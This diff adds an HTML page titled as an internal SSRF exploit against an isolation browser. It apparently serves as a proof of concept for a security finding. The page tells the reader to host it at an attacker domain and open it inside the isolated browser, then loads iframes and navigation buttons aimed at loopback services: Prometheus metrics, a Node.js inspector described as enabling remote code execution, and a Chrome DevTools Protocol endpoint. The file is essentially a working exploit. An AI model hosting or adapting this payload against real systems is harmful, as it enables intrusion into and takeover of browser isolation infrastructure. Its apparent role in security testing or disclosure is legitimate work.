@@ -1,1 +1,54 @@
-
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Internal SSRF Exploit (Isolation Browser)</title>
+  </head>
+  <body>
+    <h1>CHAIN-01: Internal Browser Payload</h1>
+    <p>
+      Host this file on a public server (e.g., https://attacker.com/exploit.html) and open it
+      <b>INSIDE the Isolation Browser</b>.
+    </p>
+    <p>
+      Because the Chromium URLBlocklist fails to restrict pod-loopback addresses (`127.0.0.2` and `localhost:1337`),
+      this page can directly interact with the underlying RWC container's infrastructure.
+    </p>
+    <div class="box">
+      <h2>1. Prometheus Metrics (localhost:1337)</h2>
+      <p>Attempting to load the internal RWC metrics endpoint...</p>
+      <iframe src="http://localhost:1337/metrics"></iframe><br /><br /><button
+        onclick="window.location.href = 'http://localhost:1337/metrics'"
+      >
+        Navigate Top Frame
+      </button>
+    </div>
+    <div class="box">
+      <h2>2. Node.js Inspector (127.0.0.2:9228)</h2>
+      <p>
+        Attempting to access the Node.js debugger. If this loads, the attacker can establish a WebSocket connection to
+        achieve RCE.
+      </p>
+      <iframe src="http://127.0.0.2:9228/json"></iframe><br /><br /><button
+        onclick="window.location.href = 'http://127.0.0.2:9228/json'"
+      >
+        Navigate Top Frame
+      </button>
+    </div>
+    <div class="box">
+      <h2>3. CDP Debugger (127.0.0.2:9224)</h2>
+      <p>
+        Attempting to access the Chrome DevTools Protocol endpoint. Allows full control over the isolated browser
+        instance.
+      </p>
+      <iframe src="http://127.0.0.2:9224/json/version"></iframe><br /><br /><button
+        onclick="window.location.href = 'http://127.0.0.2:9224/json/version'"
+      >
+        Navigate Top Frame
+      </button>
+    </div>
+    <script>
+      console.log('SSRF payload loaded in Isolation Browser.')
+    </script>
+  </body>
+</html>
